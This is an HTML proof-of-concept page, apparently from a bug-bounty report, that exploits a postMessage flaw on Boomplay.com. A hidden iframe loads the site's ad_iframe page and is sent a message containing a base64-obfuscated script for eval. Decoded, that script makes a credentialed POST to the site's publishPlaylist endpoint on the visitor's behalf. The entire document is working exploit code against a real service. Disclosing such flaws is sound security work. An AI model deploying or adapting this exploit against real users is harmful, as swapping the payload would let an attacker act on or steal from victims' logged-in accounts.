<html>

<head>
    <title>POC for Boomplay.com PostMessage vulnerability</title>
</head>

<body>
    <script>
        let boom = "https://www.boomplay.com/ad_iframe";
        let frame = document.createElement("iframe");
        frame.src = `${boom}`;
        frame.style.display = "none";
        frame.onload = () => {
            frame.contentWindow.postMessage({
                type: "ad_iframe",
                data: {
                    source: "BP",
                    bpData: {
                        scriptContent: { script: "<script>eval(atob(dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwp4aHIub3BlbigiUE9TVCIsICJodHRwczpcL1wvd3d3LmJvb21wbGF5LmNvbVwvcHVibGlzaFBsYXlsaXN0IiwgdHJ1ZSk7Cnhoci5zZXRSZXF1ZXN0SGVhZGVyKCJhY2NlcHQiLCAiYXBwbGljYXRpb25cL2pzb24sIHRleHRcL2phdmFzY3JpcHQsICpcLyo7IHE9MC4wMSIpOwp4aHIuc2V0UmVxdWVzdEhlYWRlcigiY29udGVudC10eXBlIiwgImFwcGxpY2F0aW9uXC9qc29uO2NoYXJzZXQ9dXRmLTgiKTsKeGhyLndpdGhDcmVkZW50aWFscyA9IHRydWU7CnZhciBib2R5ID0gIntcIm5hbWVcIjpcIkZvciBoMV9hbmFseXN0X2xheWxhIGJ5IEtoYXJhb25lXCIsXCJpc1ByaXZhdGVcIjpcIlRcIixcIm11c2ljc1wiOltdfSI7CnZhciBhQm9keSA9IG5ldyBVaW50OEFycmF5KGJvZHkubGVuZ3RoKTsKZm9yICh2YXIgaSA9IDA7IGkgPCBhQm9keS5sZW5ndGg7IGkrKykKICBhQm9keVtpXSA9IGJvZHkuY2hhckNvZGVBdChpKTsgCnhoci5zZW5kKG5ldyBCbG9iKFthQm9keV0pKTs=));<\/script>" }
                    },
                    lmxType: "JSCode"
                }
            }, "*");
        }
        document.body.appendChild(frame);
    </script>
</body>

</html>